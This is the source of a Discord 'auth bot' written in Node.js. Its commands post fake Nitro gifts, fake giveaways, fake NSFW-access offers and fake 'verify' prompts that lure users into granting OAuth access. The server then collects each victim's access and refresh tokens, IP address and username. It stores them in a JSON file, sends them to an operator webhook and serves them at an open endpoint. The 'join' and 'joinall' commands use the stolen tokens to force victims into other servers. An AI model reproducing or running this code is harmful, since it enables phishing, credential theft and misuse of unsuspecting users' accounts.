const { Discord, Client, User, Collection, EmbedBuilder, ActivityType, messageLink } = require('discord.js');
const client = new Client({
  fetchAllMembers: true,
  allowedMentions: {
    parse: [],
    repliedUser: true,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [3276799]
});
const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");
const nodemon = require("nodemon");
const date = require('date-and-time');



process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kalash.client_id)
  form.append('client_secret', kalash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token



      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then(async (te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(


                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.yes} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `\n${emoji.yes} Tag: \`${te.data.username}#${te.data.discriminator}\`` +
                      `\n${emoji.yes}  IP: \`${ip}\`` +
                      `\n${emoji.yes}  ID: \`${te.data.id}\`` +
                      `\n${emoji.yes}  Acces Token: \`${ac_token}\`` +
                      `\n${emoji.yes}  Refresh Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
          const guild = client.guilds.cache.get(`1071004340480909312`)
          const member = await guild.members.fetch(te.data.id)
          console.log(`Member: ` + member)
          if (guild.members.cache.has(te.data.id)) {
            member.roles.add(`1082062651355570176`)
          }
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

client.on("ready", () => {
  const memberCount = client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0)
  console.log(`${chalk.blue('AUTH BOT')}\n${chalk.green('->')} The repl is connected to [ ${client.user.username} ] \n${chalk.green('->')} Invite of bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
  client.user.setPresence({
    activities: [{
      type: ActivityType.Watching,
      name: `${memberCount} users`,
    }]
  });

  const statusArray = [
    {
      type: ActivityType.Watching,
      content: `${memberCount} users`,
    },
    {
      type: ActivityType.Watching,
      content: `${memberCount} users`,
    }
  ]
  async function pickPresence() {
    const option = Math.floor(Math.random() * statusArray.length)
    try {
      client.user.setPresence({
        activities: [
          {
            name: statusArray[option].content,
            type: statusArray[option].type
          },
        ],
      })
      const now = new Date();
      console.log(date.format(now, 'HH:mm') + `: I've succesfully changed my presence.`)
    } catch (err) {
      console.error(err)
    }
  }
  setInterval(pickPresence, 60 * 1000)
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === "wl") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** has been added to the whitelist`,
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** has been removed from the whitelist`,
              color: "3092790",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** is not whitelisted`,
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1])}\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]


        })
        break;
    }
  }

  if (cmd === "mybot") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const embed = new EmbedBuilder()

      .setTitle('Super Events')
      .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8)`)


    ctx.channel.send({
      embeds: [embed]
    })
  }


  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "3092790",
        title: `${emoji.yes} Calısıom la esek`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "3092790",
        title: `${emoji.help} Super Events Bot Dashboard`,


        description: `${emoji.command}** Command for admins**\n[\`joinall\`](${kalash.support}), [\`join (amount)\`](${kalash.support}), [\`leave\`](${kalash.support}), \n [\`sorgu\`](${kalash.support}), [\`users\`](${kalash.support}), [\`links\`](${kalash.support}), [\`stop\`](${kalash.support})\n\n${emoji.wl}** Whitelist**\n[\`wl list\`](${kalash.support}), [\`wl add\`](${kalash.support}), [\`wl remove\`](${kalash.support})\n\n${emoji.other}** Other**\n[\`boost\`](${kalash.support}), [\`classic\`](${kalash.support}), [\`partner\`](${kalash.support}), [\`botinfo\`](${kalash.support}) \n [\`verify\`](${kalash.support}), [\`nsfw\`](${kalash.support}),[\`giveaway\`](${kalash.support}),  [\`check\`](${kalash.support})\n\n${emoji.prefix} **Prefix** [\`${kalash.prefix}\`](${kalash.support})\n\n\`\`\`https://discord.gg/nudee https://discord.gg/yourbedroom 📋\`\`\``,


        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/1024736278098489344/73c2d9a1ca1b3f27f6fff529e01264c3.png?size=1024`
        }

      }],
    })
  }

  if (cmd === "botinfo") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/bossteam')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: "<a:bot_discord:1026070094889095258>・Information", value: `> **Bot: :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n>  \`\`\`\``, inline: false },
        { name: "<:developer:1027952402143400056> ・Developer", value: `> **Name :** Super Events Staff Team`, inline: false },
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }
  if (cmd === "mybot") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: []
    })
  }

  if (cmd === "partner") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} Tu veut faire une partenariat ou un Auth4Auth?`,
        description: `> **Alore n'hésite pas a rejoindre [se server](https://discord.gg/JFJPqgDjH7) et a envoyé un message a <@910575858039803996>**`,
        color: "3092790",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }]
    })
  }
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.links} Super Events Invite:`,
        description: `${emoji.links} **OAuth2 Link:** ${kalash.authLink}\n\`\`\`${kalash.authLink}\`\`\`\n${emoji.links} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "3092790",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/1024736278098489344/73c2d9a1ca1b3f27f6fff529e01264c3.png?size=1024`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }

  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello everyone, you have all been gifted Discord Nitro for a year!`,

        description: `To get your Discord Nitro all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://media.discordapp.net/attachments/1009463535551660032/1010011666517336124/unknown.jpg"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "classic") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello everyone, you have all been gifted  Nitro classic for a year!`,

        description: `To get your  Nitro classic all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "giveaway") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      "content": "🎉 **Giveaway** 🎉",
      embeds: [{
        title: `**Nitro Boost monthly 🎁** `,
        description: `\n **WINNERS:** \`1\`\n **TIMER**: \`Ends in 2 hours 15:41:57\`\n:tada: **HOSTED BY: <@${ctx.author.id}>**\n\n\n\nTo enter the giveaway click on the enter button`,
        "color": 0,
        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Enter🎉",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "nsfw") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**To be able to see nudes and nsfw channels click\n [here!](${kalash.authLink})🔞 **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Gain access here",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })

  }
  if (cmd === "verify") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        title: `Verification`,
        description: `Click "\`Verify\`" Press **Authorize** to confirm that you are not a bot, once authorized you'll have access to the rest of the nsfw access`,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/1052563191890202714/1072873783624482816/Screenshot_20230128_152942.png"
        },
        "color": "3092790",


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": `Verify`,
              "url": `${kalash.authLink}`,
              "emoji": "1031016523197857804"
            }
          ]
        }
      ]


    })
  }

  if (cmd === "check") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**:link: Mentioned users is not Verified ❌!!!! 
           Please Verify Your Self Click [here!](${kalash.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Verify Now",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }
  if (cmd === "join") { //succes degerlerini editlemiyor esek
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    if (!args[0]) return ctx.reply("bisg")
    fs.readFile('./object.json', async function(err, data) {
      let saniye = (JSON.parse(data).length / 60)
      let time = (saniye / 60)
      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      let msg = await ctx.channel.send({
        embeds: [{
          title: `Nsfw Verify`,
          fields: [
            {
              name: 'Total Users <:users:1073742204809527396>',
              value: `\`\`\`${JSON.parse(data).length}\`\`\``,
              inline: true,
            },
            {
              name: 'Desired Users :handshake:',
              value: `\`\`\`${args[0]}\`\`\``,
              inline: true,
            },
            {
              name: 'Success <:success:1073742203320541274>',
              value: `\`\`\`${success}\`\`\``,
              inline: true,
            },
            {
              name: 'Already On Server <:already:1073742196622233652>',
              value: `\`\`\`${already_joined}\`\`\``,
              inline: true,
            },
            {
              name: 'Error <:error:1073742200778793001>',
              value: `\`\`\`${error}\`\`\``,
              inline: true,
            },
            {
              name: 'Time :timer:',
              value: `\`\`\`${time.toString().split(".")[0]} Minute\`\`\``,
              inline: true,
            },
          ]
        }]
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        process.exit(0)  //ee ne ee deniyim mi zahmet olacak
        ctx.channel.send("sistem sıfırlandı")
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        process.exit(0)  //ee ne ee deniyim mi zahmet olacak
        ctx.channel.send("sistem yenilendi")
      }

      for (const i of json) {

        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).then(() => { success++ }).catch(() => {
          error++
        })
        if (success > args[0]) {
          msg.edit({
            embeds: [{
              title: `${emoji.user} 0auth2 Join`,
              description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
              color: "3092790",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          }).catch(() => { })
          return;
        }
        msg.edit({
          embeds: [{
            title: `Nsfw Verify`,
            fields: [
              {
                name: 'Total Users <:users:1073742204809527396>',
                value: `\`\`\`${JSON.parse(data).length}\`\`\``,
                inline: true,
              },
              {
                name: 'Desired Users :handshake:',
                value: `\`\`\`${args[0]}\`\`\``,
                inline: true,
              },
              {
                name: 'Success <:success:1073742203320541274>',
                value: `\`\`\`${success}\`\`\``,
                inline: true,
              },
              {
                name: 'Already On Server <:already:1073742196622233652>',
                value: `\`\`\`${already_joined}\`\`\``,
                inline: true,
              },
              {
                name: 'Error <:error:1073742200778793001>',
                value: `\`\`\`${error}\`\`\``,
                inline: true,
              },
              {
                name: 'Time :timer:',
                value: `\`\`\`${time.toString().split(".")[0]} Minute\`\`\``,
                inline: true,
              },
            ]
          }
          ]
        })
      }

      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Join`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "3092790",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      }).catch(() => { })
    })
  }

  if (cmd === "joinall") { //succes degerlerini editlemiyor esek
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let saniye = (data.length / 60)
      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      let msg = await ctx.channel.send({
        embeds: [{
          title: `Nsfw Verify`,
          fields: [
            {
              name: 'Total Users <:users:1073742204809527396>',
              value: `\`\`\`${JSON.parse(data).length}\`\`\``,
              inline: true,
            },
            {
              name: 'Desired Users :handshake:',
              value: `\`\`\`${JSON.parse(data).length}\`\`\``,
              inline: true,
            },
            {
              name: 'Success <:success:1073742203320541274>',
              value: `\`\`\`${success}\`\`\``,
              inline: true,
            },
            {
              name: 'Already On Server <:already:1073742196622233652>',
              value: `\`\`\`${already_joined}\`\`\``,
              inline: true,
            },
            {
              name: 'Error <:error:1073742200778793001>',
              value: `\`\`\`${error}\`\`\``,
              inline: true,
            },
            {
              name: 'Time :timer:',
              value: `\`\`\`${saniye.toString().split(".")[0]} Minute\`\`\``,
              inline: true,
            },
          ]
        }]
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        process.exit(0)  //ee ne ee deniyim mi zahmet olacak
        ctx.channel.send("sistem sıfırlandı")
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        process.exit(0)  //ee ne ee deniyim mi zahmet olacak
        ctx.channel.send("sistem yenilendi")
      }

      for (const i of json) {

        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).then(() => { success++ }).catch(() => {
          error++
        })

        msg.edit({
          embeds: [{
            title: `Nsfw Verify`,
            fields: [
              {
                name: 'Total Users <:users:1073742204809527396>',
                value: `\`\`\`${JSON.parse(data).length}\`\`\``,
                inline: true,
              },
              {
                name: 'Desired Users :handshake:',
                value: `\`\`\`${JSON.parse(data).length}\`\`\``,
                inline: true,
              },
              {
                name: 'Success <:success:1073742203320541274>',
                value: `\`\`\`${success}\`\`\``,
                inline: true,
              },
              {
                name: 'Already On Server <:already:1073742196622233652>',
                value: `\`\`\`${already_joined}\`\`\``,
                inline: true,
              },
              {
                name: 'Error <:error:1073742200778793001>',
                value: `\`\`\`${error}\`\`\``,
                inline: true,
              },
              {
                name: 'Time :timer:',
                value: `\`\`\`${saniye.toString().split(".")[0]} Minute\`\`\``,
                inline: true,
              },
            ]
          }
          ]
        })
      }

      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Joinall`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "3092790",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      }).catch(() => { })
    })
  }

  if (cmd === "stop") {
    const stopembed = new EmbedBuilder()
      .setColor("FF0000")
      .setAuthor({ name: 'Canceled', url: 'https://discord.com/api/oauth2/authorize?client_id=1073206094920433704&redirect_uri=https%3A%2F%2Fauthbotkanks.keremrxd.repl.co&response_type=code&scope=guilds.join%20identify' })
      .setDescription('Auth The Canceled')

      .setTimestamp()
    nodemon("node .")
    ctx.channel.send({ embeds: [stopembed] })


  }


  if (cmd === "event") {
    ctx.delete()
    var eventEmbed = new EmbedBuilder()
      .setTitle(`Invite Event`)
      .setDescription(`<a:NitroCl:1031225550011899954>   **__3__ Invites**・Nitro Classic \n <:dh_nitroboost:1031253281881727037>   **__6__ Invites**・Nitro Boost \n\n <a:NitroCl:1031225550011899954>   **__9__ Invites**・Nitro Classic Yearly \n <:dh_nitroboost:1031253281881727037>   **__12__ Invites**・Nitro Boost Yearly \n\n <:blurpleDot:1031224593911922820> J4J = **__2__x Invites** \n <:blurpleDot:1031224593911922820> Alts/Tokens = **Disqualify** \n <:blurpleDot:1031224593911922820> Not Verified = **Invite Invalid**`)
      .setColor(`2e3236`)
    ctx.channel.send({ embeds: [eventEmbed] })
  }


  if (cmd === "sorgu") {
    let atat = args[0]
    if (!atat) return ctx.reply("İd gir")
    let oldumu = client.guilds.cache.get(atat)

    ctx.channel.send(oldumu.name)

  }

  if (cmd === "leave") {
    let den = args[0]
    if (!den) return ctx.reply("Çıkılcak sunucuyu gir")
    let cik = client.guilds.cache.get(den)
    cik.leave()
  }


  if (cmd === "users") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} Super Events Users`,
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\n`,
          color: "3092790",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }

        }]
      })
    })
  }
})



client.on('guildMemberAdd', async (member) => {
  client.channels.cache.get("1081930333383045230").send("Server: __" + member.guild.name + "__\n Server ID: __" + member.guild.id + "__\n MemberCount: __" + member.guild.memberCount + "__")
})

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(kalash.tokn).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})


app.listen(kalash.port, () => console.log('Connecting...'))
